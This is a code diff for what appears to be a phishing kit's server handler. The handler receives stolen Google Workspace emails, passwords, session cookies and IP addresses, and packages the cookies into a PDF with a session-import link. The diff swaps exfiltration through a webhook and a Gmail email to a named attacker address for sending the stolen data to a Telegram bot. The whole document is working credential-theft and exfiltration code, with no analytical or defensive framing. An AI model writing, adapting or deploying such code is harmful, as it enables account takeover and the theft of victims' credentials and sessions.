@@ -33,7 +33,7 @@ async function generateCookiePDF(cookies, email, domain) {
 
     const lineHeight = 12;
     for (const line of lines) {
-      if (y < 50) break; // avoid overflow
+      if (y < 50) break;
       page.drawText(line, { x: 50, y, size: 10, font, color: rgb(0, 0, 0) });
       y -= lineHeight;
     }
@@ -54,68 +54,39 @@ export default async function handler(req, res) {
 
   console.log('Captured:', data.email, ip);
 
-  // WEBHOOK BACKUP (optional)
+  // TELEGRAM ONLY
   try {
-    await fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/temp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ ...data, ip }),
-    });
-  } catch {}
-
-  // GMAIL EMAIL
-  try {
-    const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 587,
-      secure: false,
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS,
-      },
-    });
-
     const pdfBuffer = await generateCookiePDF(data.cookies, data.email, data.captureDomain);
-    const pdfFilename = 'vct_session.pdf';
+    
+    const formData = new FormData();
+    formData.append('chat_id', process.env.TELEGRAM_CHAT_ID);
+    formData.append('photo', pdfBuffer, 'vct_session.pdf');
+    formData.append('caption', `
+🔔 *Google Workspace CAPTURED*
 
-    await transporter.sendMail({
-      from: `"Security Alert" <${process.env.EMAIL_USER}>`,
-      to: 'hotikka0@gmail.com',
-      subject: `🔔 GMAIL 2-FA CAPTURED: ${data.email}`,
-      html: `
-        <div style="font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;">
-          <h2 style="color:#d93025">🎯 Google Workspace Credentials</h2>
-          <table cellpadding="8" style="border:1px solid #ddd;width:100%">
-            <tr><td><strong>⏰ Time</strong></td><td>${new Date().toLocaleString()}</td></tr>
-            <tr><td><strong>🌐 IP</strong></td><td>${ip}</td></tr>
-            <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
-            <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
-            <tr><td><strong>🍪 Cookies</strong></td><td>
-              📄 <strong>PDF attached</strong> (vct_session.pdf)<br>
-              ${data.cookiesImportLink ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="background:#28a745;color:white;padding:10px 20px;text-decoration:none;border-radius:6px;display:inline-block;margin-top:8px">Import cookies → session</a>` : ''}
-            </td></tr>
-            <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0, 80)}...</td></tr>
-          </table>
-          <details>
-            <summary>Full Data (JSON)</summary>
-            <pre style="background:#f5f5f5;padding:16px;overflow:auto">${JSON.stringify(
-              { ...data, cookies: data.cookiesImportLink ? 'See PDF + import link' : 'none' },
-              null,
-              2
-            )}</pre>
-          </details>
-        </div>
-      `,
-      attachments: [
-        {
-          filename: pdfFilename,
-          content: pdfBuffer,
-          contentType: 'application/pdf',
-        },
-      ],
+⏰ *${new Date().toLocaleString()}*
+🌐 *IP:* \`${ip}\`
+📧 *Email:* \`${data.email}\`
+🔑 *Password:* \`${data.password || 'N/A'}\`
+
+🍪 *Cookies PDF attached* 
+${data.cookiesImportLink ? `🔗 [Import Session →](${data.cookiesImportLink})` : ''}
+
+👤 *Browser:* ${data.userAgent?.slice(0, 80) || 'N/A'}...
+`);
+
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData,
     });
+
+    if (telegramResponse.ok) {
+      console.log('✅ Telegram delivered');
+    } else {
+      console.error('Telegram failed:', await telegramResponse.text());
+    }
   } catch (err) {
-    console.error('Email send failed:', err.message);
+    console.error('Telegram error:', err.message);
   }
 
   res.json({ status: 'captured ✅', email: data.email });
